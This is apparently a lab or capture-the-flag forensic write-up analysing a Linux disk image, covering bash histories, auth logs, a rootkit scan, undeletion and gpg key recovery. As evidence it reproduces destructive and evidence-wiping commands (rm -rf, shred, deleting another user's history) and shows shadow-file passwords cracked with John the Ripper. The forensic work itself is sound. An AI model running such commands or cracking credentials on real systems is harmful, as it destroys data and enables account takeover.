/images/sda1/home/rich/swiss_keys/swisskey8.gpg
/images/sda1/home/rich/.mozilla
/images/sda1/home/rich/.mozilla/cache
/images/sda1/home/rich/.thunderbird
/images/sda1/home/rich/.games
/images/sda1/home/rich/.viminfo
/images/sda1/home/rich/.gnupg
/images/sda1/home/rich/.gnupg/gpg.conf
/images/sda1/home/rich/.gnupg/random_seed
/images/sda1/home/rich/.gnupg/pubring.gpg
/images/sda1/home/rich/.lesshst
</pre>
</div>

<p>
Rich have no bash history file
</p>
</div>
</div>

<div id="outline-container-org74beff2" class="outline-4">
<h4 id="org74beff2"><span class="section-number-4">5.2.14</span> Jeeves account</h4>
<div class="outline-text-4" id="text-5-2-14">
<p>
Look at the users home dirs.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 121: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/jeeves -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 122: </span>Results</label><pre class="src src-text">/images/sda1/home/jeeves
/images/sda1/home/jeeves/.bashrc
/images/sda1/home/jeeves/.bash_profile
/images/sda1/home/jeeves/.bash_logout
/images/sda1/home/jeeves/housekeepers
/images/sda1/home/jeeves/.bash_history
</pre>
</div>

<p>
Look at jeeves&rsquo;s bash history
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 123: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/jeeves/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 124: </span>Results</label><pre class="src src-text">w
watch "w | grep -v jeeves"
w
su rich
cat /home/rich/.bash_history
su -
</pre>
</div>
</div>
</div>

<div id="outline-container-org4973010" class="outline-4">
<h4 id="org4973010"><span class="section-number-4">5.2.15</span> Gardener account</h4>
<div class="outline-text-4" id="text-5-2-15">
<p>
Look more into Gardener account.
</p>

<p>
Look at files found in Gardener home dir.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 125: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/gardener -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 126: </span>Results</label><pre class="src src-text">/images/sda1/home/gardener
/images/sda1/home/gardener/.bashrc
/images/sda1/home/gardener/.bash_profile
/images/sda1/home/gardener/.bash_logout
/images/sda1/home/gardener/.bash_history
/images/sda1/home/gardener/.gnupg
/images/sda1/home/gardener/.gnupg/gpg.conf
/images/sda1/home/gardener/.gnupg/secring.gpg
/images/sda1/home/gardener/.gnupg/pubring.gpg
</pre>
</div>

<p>
Gardener bash history.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 127: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/gardener/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 128: </span>Results</label><pre class="src src-text">top
lsof
ps aux
ls /home/
gpg
cat .bash_history
gpg
cat .bash_history
</pre>
</div>
</div>
</div>

<div id="outline-container-org41b3894" class="outline-4">
<h4 id="org41b3894"><span class="section-number-4">5.2.16</span> Chef account</h4>
<div class="outline-text-4" id="text-5-2-16">
<p>
Look at the Chef home dir.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 129: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/chef -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 130: </span>Results</label><pre class="src src-text">/images/sda1/home/chef
/images/sda1/home/chef/.bashrc
/images/sda1/home/chef/.bash_profile
/images/sda1/home/chef/.bash_logout
/images/sda1/home/chef/recipes
/images/sda1/home/chef/recipes/bread
/images/sda1/home/chef/.bash_history
</pre>
</div>

<p>
Look at chef&rsquo;s bash history
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 131: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/chef/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 132: </span>Results</label><pre class="src src-text">mkdir recipes
cd recipes/
ls
echo "best bread recipe:" &gt; bread
</pre>
</div>
</div>
</div>

<div id="outline-container-orgaea4377" class="outline-4">
<h4 id="orgaea4377"><span class="section-number-4">5.2.17</span> ubuntu account</h4>
<div class="outline-text-4" id="text-5-2-17">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 133: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/home/ubuntu -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">sudo cat /images/sda1/home/ubuntu/.bash_history
</pre>
</div>
</div>
</div>

<div id="outline-container-orge83383a" class="outline-4">
<h4 id="orge83383a"><span class="section-number-4">5.2.18</span> Root account</h4>
<div class="outline-text-4" id="text-5-2-18">
<p>
Look at the root home dirs.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 134: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/root/ -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 135: </span>Results</label><pre class="src src-text">/images/sda1/root/
/images/sda1/root/.profile
/images/sda1/root/.bashrc
/images/sda1/root/.aptitude
/images/sda1/root/.aptitude/config
/images/sda1/root/.bash_history
/images/sda1/root/.viminfo
/images/sda1/root/.lesshst
/images/sda1/root/.rnd
/images/sda1/root/.ssh
/images/sda1/root/.ssh/known_hosts
</pre>
</div>

<p>
Look at root&rsquo;s bash history
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 136: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/root/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 137: </span>Results</label><pre class="src src-text">shutdown -r now
shutdown -r now
vi /etc/passwd
rm -rf /home/butler
ls
shred -u -z motd
shred -us -z secret/*
shred -u -z secret/*
rmdir secrets
ls
rmdir secret
ls secret/
shred -u -z secret/secrets/*
rm -rf secret/
ls
cat /dev/urandom &gt; file
cat /dev/zero &gt; file2
ls
rm file*
less ~rich/.bash_history
chown rich:rich -R /home/rich
updatedb &amp; find /
cat ~rich/.bash_history
rm ~rich/.bash_history
shutdown -r now
</pre>
</div>
</div>
</div>

<div id="outline-container-org4f53189" class="outline-4">
<h4 id="org4f53189"><span class="section-number-4">5.2.19</span> Look for log files</h4>
<div class="outline-text-4" id="text-5-2-19">
<p>
List log files
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 138: </span>Commands</label><pre class="src src-sh">ls -R /images/sda1/var/log | <span style="color: #CC9393;">\</span>
awk <span style="color: #CC9393;">'/:$/&amp;&amp;f{s=$0;f=0} /:$/&amp;&amp;!f{sub(/:$/,"");s=$0;f=1;next} NF&amp;&amp;f{ print s"/"$0 }'</span> | <span style="color: #CC9393;">\</span>
sort
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 139: </span>Results</label><pre class="src src-text">/images/sda1/var/log/aptitude
/images/sda1/var/log/auth.log
/images/sda1/var/log/btmp
/images/sda1/var/log/daemon.log
/images/sda1/var/log/debug
/images/sda1/var/log/dmesg
/images/sda1/var/log/dpkg.log
/images/sda1/var/log/evms-engine.log
/images/sda1/var/log/kern.log
/images/sda1/var/log/lpr.log
/images/sda1/var/log/mail.err
/images/sda1/var/log/mail.info
/images/sda1/var/log/mail.log
/images/sda1/var/log/mail.warn
/images/sda1/var/log/messages
/images/sda1/var/log/news
/images/sda1/var/log/news/news.crit
/images/sda1/var/log/news/news.err
/images/sda1/var/log/news/news.notice
/images/sda1/var/log/syslog
/images/sda1/var/log/udev
/images/sda1/var/log/user.log
/images/sda1/var/log/uucp.log
</pre>
</div>

<p>
auth.log
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 140: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/var/log/auth.log
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 141: </span>Results</label><pre class="src src-text">Sep 10 00:02:10 megabucks sshd[3636]: Server listening on :: port 22.
Sep 10 00:03:24 megabucks sshd[3721]: Accepted password for root from 10.10.10.100 port 56860 ssh2
Sep 10 00:03:24 megabucks sshd[3723]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:03:24 megabucks sshd[3723]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:03:24 megabucks sshd[3723]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:03:24 megabucks sshd[3723]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:03:24 megabucks sshd[3723]: (pam_unix) session opened for user root by root(uid=0)
Sep 10 00:03:55 megabucks sshd[3736]: Accepted password for gardener from 10.10.10.101 port 48537 ssh2
Sep 10 00:03:55 megabucks sshd[3738]: (pam_unix) session opened for user gardener by (uid=0)
Sep 10 00:03:55 megabucks sshd[3736]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:03:55 megabucks sshd[3736]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:03:55 megabucks sshd[3736]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:03:55 megabucks sshd[3736]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:04:12 megabucks sshd[3738]: (pam_unix) session closed for user gardener
Sep 10 00:04:43 megabucks sshd[3764]: Accepted password for gardener from 10.10.10.101 port 48538 ssh2
Sep 10 00:04:43 megabucks sshd[3770]: (pam_unix) session opened for user gardener by (uid=0)
Sep 10 00:04:43 megabucks sshd[3764]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:04:43 megabucks sshd[3764]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:04:43 megabucks sshd[3764]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:04:43 megabucks sshd[3764]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:05:09 megabucks sshd[3766]: Accepted password for chef from 10.10.10.103 port 48539 ssh2
Sep 10 00:05:09 megabucks sshd[3794]: (pam_unix) session opened for user chef by (uid=0)
Sep 10 00:05:09 megabucks sshd[3766]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:05:09 megabucks sshd[3766]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:05:09 megabucks sshd[3766]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:05:09 megabucks sshd[3766]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:05:21 megabucks sshd[3792]: Accepted password for jeeves from 10.10.10.102 port 48541 ssh2
Sep 10 00:05:21 megabucks sshd[3816]: (pam_unix) session opened for user jeeves by (uid=0)
Sep 10 00:05:21 megabucks sshd[3792]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:05:21 megabucks sshd[3792]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:05:21 megabucks sshd[3792]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:05:21 megabucks sshd[3792]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:12:39 megabucks sshd[3794]: (pam_unix) session closed for user chef
Sep 10 00:17:01 megabucks CRON[4011]: (pam_unix) session opened for user root by (uid=0)
Sep 10 00:17:02 megabucks CRON[4011]: (pam_unix) session closed for user root
Sep 10 00:24:54 megabucks sshd[3770]: (pam_unix) session closed for user gardener
Sep 10 00:25:02 megabucks sshd[3816]: (pam_unix) session closed for user jeeves
Sep 10 00:26:46 megabucks sshd[4254]: Accepted password for gardener from 10.10.10.101 port 53440 ssh2
Sep 10 00:26:46 megabucks sshd[4258]: (pam_unix) session opened for user gardener by (uid=0)
Sep 10 00:26:46 megabucks sshd[4254]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:26:46 megabucks sshd[4254]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:26:46 megabucks sshd[4254]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:26:46 megabucks sshd[4254]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:27:09 megabucks sshd[4256]: Accepted password for chef from 10.10.10.103 port 53441 ssh2
Sep 10 00:27:09 megabucks sshd[4285]: (pam_unix) session opened for user chef by (uid=0)
Sep 10 00:27:09 megabucks sshd[4256]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:27:09 megabucks sshd[4256]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:27:09 megabucks sshd[4256]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:27:09 megabucks sshd[4256]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:27:30 megabucks sshd[4252]: Accepted password for jeeves from 10.10.10.102 port 53439 ssh2
Sep 10 00:27:30 megabucks sshd[4308]: (pam_unix) session opened for user jeeves by (uid=0)
Sep 10 00:27:30 megabucks sshd[4252]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:27:30 megabucks sshd[4252]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:27:30 megabucks sshd[4252]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:27:30 megabucks sshd[4252]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:27:55 megabucks sshd[4258]: (pam_unix) session closed for user gardener
Sep 10 00:28:04 megabucks sshd[4285]: (pam_unix) session closed for user chef
Sep 10 00:28:37 megabucks su[4365]: + pts/2 jeeves:rich
Sep 10 00:28:37 megabucks su[4365]: (pam_unix) session opened for user rich by (uid=1002)
Sep 10 00:31:20 megabucks sshd[4405]: Accepted password for root from 10.10.10.107 port 48542 ssh2
Sep 10 00:31:20 megabucks sshd[4407]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:31:20 megabucks sshd[4407]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:31:20 megabucks sshd[4407]: lastlog_filetype: Couldn't stat /var/log/lastlog: No such file or directory
Sep 10 00:31:20 megabucks sshd[4407]: lastlog_openseek: /var/log/lastlog is not a file or directory!
Sep 10 00:31:20 megabucks sshd[4407]: (pam_unix) session opened for user root by root(uid=0)
Sep 10 00:37:15 megabucks su[4484]: + pts/2 rich:root
Sep 10 00:37:15 megabucks su[4484]: (pam_unix) session opened for user root by (uid=1001)
Sep 10 00:37:42 megabucks su[4484]: (pam_unix) session closed for user root
Sep 10 00:37:51 megabucks su[4365]: (pam_unix) session closed for user rich
Sep 10 00:38:19 megabucks su[4512]: + pts/2 jeeves:root
Sep 10 00:38:19 megabucks su[4512]: (pam_unix) session opened for user root by (uid=1002)
Sep 10 00:38:40 megabucks sshd[3636]: Received signal 15; terminating.
</pre>
</div>
</div>
</div>

<div id="outline-container-org3e2e1c1" class="outline-4">
<h4 id="org3e2e1c1"><span class="section-number-4">5.2.20</span> Look for binary files</h4>
<div class="outline-text-4" id="text-5-2-20">
<div class="org-src-container">
<pre class="src src-sh">sudo ls -la /images/sda1/bin | grep jack
sudo ls -la /images/sda1/usr/bin | grep jack
</pre>
</div>
</div>
</div>

<div id="outline-container-org7c37304" class="outline-4">
<h4 id="org7c37304"><span class="section-number-4">5.2.21</span> Motd</h4>
<div class="outline-text-4" id="text-5-2-21">
<p>
Look at the welcome SSH message
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 142: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/motd
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 143: </span>Results</label><pre class="src src-text">Linux megabucks 2.6.15-29-server #1 SMP Wed Aug 29 14:26:14 UTC 2007 i686 GNU/Linux

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
---------------------------------------------------------------------
  Welcome to the computer system of the richest man in the country!
---------------------------------------------------------------------
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd3f3824" class="outline-4">
<h4 id="orgd3f3824"><span class="section-number-4">5.2.22</span> John The Ripper</h4>
<div class="outline-text-4" id="text-5-2-22">
<p>
<a id="orgdae9888"></a>
</p>

<p>
!This is done on my local computer!
</p>

<p>
I downloaded the <b>passwd</b> and <b>shadow</b> file from the system to my
local computer and executed <code>john</code> on the file.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 144: </span>Results</label><pre class="src src-text">butler           (jeeves)
moneymoney       (root)
plants           (gardener)
food             (chef)
</pre>
</div>

<p>
Not all of the users passwords where cracked due to the time.
</p>
</div>
</div>

<div id="outline-container-org223d943" class="outline-4">
<h4 id="org223d943"><span class="section-number-4">5.2.23</span> Check for rootkits</h4>
<div class="outline-text-4" id="text-5-2-23">
<p>
<a id="orgf2c87d6"></a>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 145: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> /images/chkrootkit-0.47
sudo ./chkrootkit -r /images/sda1/
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 146: </span>Results</label><pre class="src src-text">ROOTDIR is `/images/sda1/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `date'... not infected
Checking `du'... not infected
Checking `dirname'... not infected
Checking `echo'... not infected
Checking `egrep'... not infected
Checking `env'... not infected
Checking `find'... not infected
Checking `fingerd'... not found
Checking `gpm'... not found
Checking `grep'... not infected
Checking `hdparm'... not infected
Checking `su'... not infected
Checking `ifconfig'... not infected
Checking `inetd'... not infected
Checking `inetdconf'... not infected
Checking `identd'... not found
Checking `init'... not infected
Checking `killall'... not infected
Checking `ldsopreload'... not infected
Checking `login'... not infected
Checking `ls'... not infected
Checking `lsof'... not infected
Checking `mail'... not found
Checking `mingetty'... not found
Checking `netstat'... not infected
Checking `named'... not found
Checking `passwd'... not infected
Checking `pidof'... not infected
Checking `pop2'... not found
Checking `pop3'... not found
Checking `ps'... not infected
Checking `pstree'... not infected
Checking `rpcinfo'... not infected
Checking `rlogind'... not found
Checking `rshd'... not found
Checking `slogin'... not infected
Checking `sendmail'... not found
Checking `sshd'... not infected
Checking `syslogd'... not infected
Checking `tar'... not infected
Checking `tcpd'... not infected
Checking `tcpdump'... not infected
Checking `top'... not infected
Checking `telnetd'... not found
Checking `timed'... not found
Checking `traceroute'... not found
Checking `vdir'... not infected
Checking `w'... not infected
Checking `write'... not infected
Checking `aliens'... no suspect files
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... nothing found
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
Searching for OBSD rk v1... nothing found
Searching for LOC rootkit... nothing found
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... nothing found
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for anomalies in shell history files... nothing found
Checking `asp'... not infected
Checking `bindshell'... not tested
Checking `lkm'... chkproc: not tested
Checking `rexedcs'... not found
Checking `sniffer'... not tested
Checking `w55808'... not infected
Checking `wted'... Checking `scalper'... not infected
Checking `slapper'... not infected
Checking `z2'... not tested: not found wtmp and/or lastlog file
Checking `chkutmp'... chkutmp: nothing deleted
</pre>
</div>
</div>
</div>

<div id="outline-container-org90dfd5b" class="outline-4">
<h4 id="org90dfd5b"><span class="section-number-4">5.2.24</span> Search for deleted files on Ext2.</h4>
<div class="outline-text-4" id="text-5-2-24">
<p>
<a id="org28954cc"></a>
</p>

<p>
Searching for deleted files on a Ext2 disk.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 147: </span>Commands (Need to be executed in a shell)</label><pre class="src src-sh">yes | sudo e2undel -d /dev/loop0 -s /images/recovered -a -t
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 148: </span>Results</label><pre class="src src-sh">e2undel 0.82
Trying to recover files on /dev/loop0, saving them on /images/recovered

/dev/loop0 opened for read-only access
/dev/loop0 was not cleanly unmounted.
Do you want wo continue (y/n)? 731752 inodes (706253 free)
1461883 blocks of 1024 bytes (875926 free)
last mounted on Sat Sep 15 11:03:39 2007
no entries for /dev/loop0<span style="color: #F0DFAF; font-weight: bold;"> in</span> log file
searching for deleted inodes on /dev/loop0:
731752 inodes scanned, 2846 deleted files found

   user name |  &lt; 12 h |  &lt; 48 h |   &lt; 7 d |  &lt; 30 d |   &lt; 1 y |   older
-------------+---------+---------+---------+---------+---------+--------
        root |       3 |       0 |     237 |    2601 |       0 |       0
        1001 |       0 |       0 |       5 |       0 |       0 |       0
</pre>
</div>
</div>
</div>

<div id="outline-container-org01a2ac3" class="outline-4">
<h4 id="org01a2ac3"><span class="section-number-4">5.2.25</span> Look for tmp files</h4>
<div class="outline-text-4" id="text-5-2-25">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 149: </span>Commands</label><pre class="src src-sh">ls -lRa /images/sda1/tmp
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 150: </span>Results</label><pre class="src src-text">/images/sda1/tmp:
total 3
drwxrwxrwt  3 root root 1024 2007-09-09 22:38 .
drwxr-xr-x 21 root root 1024 2007-09-15 11:05 ..
drwxr-xr-x  2 1001 1001 1024 2007-09-09 22:38 extortomatic-23421

/images/sda1/tmp/extortomatic-23421:
total 3
drwxr-xr-x 2 1001 1001 1024 2007-09-09 22:38 .
drwxrwxrwt 3 root root 1024 2007-09-09 22:38 ..
-rw-r--r-- 1 1001 1001   20 2007-09-09 22:38 key1
</pre>
</div>
</div>
</div>

<div id="outline-container-org5333d75" class="outline-4">
<h4 id="org5333d75"><span class="section-number-4">5.2.26</span> Look for keys</h4>
<div class="outline-text-4" id="text-5-2-26">
<p>
Look at the <b>key1</b> file.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 151: </span>Commands</label><pre class="src src-sh">sudo file /images/sda1/tmp/extortomatic-23421/key1
sudo cat /images/sda1/tmp/extortomatic-23421/key1
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 152: </span>Commands</label><pre class="src src-Results">/images/sda1/tmp/extortomatic-23421/key1: ASCII text
1 23philo7dendron88
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key1*"</span>
sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key2*"</span>
sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key3*"</span>
sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key4*"</span>
sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key5*"</span>
sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key6*"</span>
sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key7*"</span>
sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key8*"</span>
sudo find /images/sda1 -type f -name <span style="color: #CC9393;">"*key9*"</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org0ea001e" class="outline-4">
<h4 id="org0ea001e"><span class="section-number-4">5.2.27</span> Key1</h4>
<div class="outline-text-4" id="text-5-2-27">
<p>
Show the key:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 153: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/tmp/extortomatic-23421/key1
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 154: </span>Results</label><pre class="src src-sh">1 23philo7dendron88
</pre>
</div>

<p>
Password length
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 155: </span>Command (LISP)</label><pre class="src src-emacs-lisp">(length <span style="color: #CC9393;">"23philo7dendron88"</span>)
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 156: </span>Result</label><pre class="src src-emacs-lisp">17
</pre>
</div>

<p>
Decrypt the message:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 157: </span>Commands</label><pre class="src src-sh"><span style="color: #DCDCCC; font-weight: bold;">cd</span> ~/
cp /images/sda1/home/rich/swiss_keys/swisskey1.gpg .
<span style="color: #DCDCCC; font-weight: bold;">echo</span> $(<span style="color: #CC9393;">awk</span> -F<span style="color: #CC9393;">" "</span> <span style="color: #CC9393;">'{print $2}'</span>cat $(<span style="color: #CC9393;">find</span> /images/sda1/tmp/ -type f -print -exec file {} + | grep ASCII | awk -F<span style="color: #CC9393;">":"</span> <span style="color: #CC9393;">'{print $1}'</span>)) | gpg --passphrase-fd 0 --no-tty -d swisskey1.gpg
rm swisskey1.gpg
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 158: </span>Results</label><pre class="src src-text">me_and_you_and_you_and_me-so_happy_2gether
</pre>
</div>
</div>
</div>

<div id="outline-container-org49ea3b5" class="outline-4">
<h4 id="org49ea3b5"><span class="section-number-4">5.2.28</span> Key2</h4>
<div class="outline-text-4" id="text-5-2-28">
<p>
Find the key
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 159: </span>Commands</label><pre class="src src-sh">sudo strings /dev/loop1 | grep <span style="color: #CC9393;">"key2"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 160: </span>Results</label><pre class="src src-text">le_key2cpu_key
le_key2cpu_key
                                        echo -n "$WPA_SUP_PNAME: wpa-private-key2 : "
                                        set_network $NW_ID private_key2 "\"$IF_WPA_PRIVATE_KEY2\"" &gt;$TO_NULL
                                        echo -n "$WPA_SUP_PNAME: wpa-wep-key2 : "
                                set_network $NW_ID wep_key2 "$IF_WPA_WEP_KEY2" &gt;$TO_NULL
private_key2
private_key2_passwd
wep_key2
Note: video modes are: -3=Ask, -2=Extended, -1=NormalVga, 1=key1, 2=key2,...
(((key2) != ((void *)0)) &amp;&amp; (((const isc__magic_t *)(key2))-&gt;magic == ((('D') &lt;&lt; 24 | ('S') &lt;&lt; 16 | ('T') &lt;&lt; 8 | ('K')))))
        my ($key, $key2) = @_ ;
        # return  0 if $key1 eq $key2
        #        -1 if $key1 lt $key2
        #         1 if $key1 gt $key2
        my ($key, $key2) = @_ ;
        # return number of bytes of $key2 which are
        my ($key1, $key2) = @_ ;
        "\L$key1" cmp "\L$key2" ;
        my($key1, $key2) = @_;
        lc $key1 cmp lc $key2 ||
        $key1 cmp $key2;
get_attr_key2string
get_userattr_key2string
get_userattr_key2string: unknown schema version specified
get_attr_key2string
get_userattr_key2string
get_userattr_key2string: unknown schema version specified
    and re-insert them one at a time with &lt;key1&gt;, all together with &lt;key2&gt;.
    wireless-key2 12345678
 int des_read_2passwords(DES_cblock *key1,DES_cblock *key2,
 another fork of the xMule project. It connects to eDonkey2000
 MLDonkey is a client application for the eDonkey2000 and other
  - access to EDonkey ( edonkey2000, overnet, emule )
  * gpg-key2ps: generate PostScript file with fingerprint paper strips
Description: eMule client for the edonkey2000 network
c02504d0 t sysrq_key_table_key2index
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
&gt; ~/swiss_keys/swisskey2
gpg --symmetric swisskey2
shred -u swisskey2
swisskey2.gpgpx
gpg --symmetric swisskey2
shred -u swisskey2
'7  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
-'  1  0  ~/swiss_keys/swisskey2
